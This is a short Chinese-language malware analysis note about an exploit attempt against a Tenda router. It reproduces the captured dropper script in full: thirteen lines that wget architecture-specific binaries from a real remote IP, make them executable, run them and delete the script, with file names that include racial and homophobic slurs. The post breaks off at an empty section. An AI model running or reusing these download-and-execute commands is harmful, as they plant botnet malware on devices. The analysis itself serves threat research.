# a tenda router sample analysis

## front

起因是无意中捕捉到以下 exp 尝试

![02de7bcc29e256c393181d6a5d837fae](E:\Pictures\markdown\02de7bcc29e256c393181d6a5d837fae.png)

url 解码后得到清晰内容：

![image-20240414205738443](E:\Pictures\markdown\image-20240414205738443.png)

这怎么忍得了，于是尝试主动探测一下，获取载荷脚本后，`tenda.sh` 内容如下：

```shell
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lol http://94.156.8.244/mips; chmod +x lol; ./lol tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lmao http://94.156.8.244/mpsl; chmod +x lmao; ./lmao tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O faggot http://94.156.8.244/x86_64; chmod +x faggot; ./faggot tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O gay http://94.156.8.244/arm; chmod +x gay; ./gay tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O retard http://94.156.8.244/arm5; chmod +x retard; ./retard tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O nigger http://94.156.8.244/arm6; chmod +x nigger; ./nigger tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O shit http://94.156.8.244/arm7; chmod +x shit; ./shit tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O nigga http://94.156.8.244/i586; chmod +x nigga; ./nigga tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kekw http://94.156.8.244/i686; chmod +x kekw; ./kekw tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O what http://94.156.8.244/powerpc; chmod +x what; ./what tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kys http://94.156.8.244/sh4; chmod +x kys; ./kys tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O shiteater http://94.156.8.244/m68k; chmod +x shiteater; ./shiteater tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O blyat http://94.156.8.244/sparc; chmod +x blyat; ./blyat tplink
rm $0
```

尝试小溯了一下这个 `94.156.8.244`，

![image-20240414205921972](E:\Pictures\markdown\image-20240414205921972.png)

目前没有什么有效信息，但是其中针对不同系统的不同 binary 文件倒是可以尝试获取一下，这里就以 `wget -O faggot http://94.156.8.244/x86_64` 为例了

## go

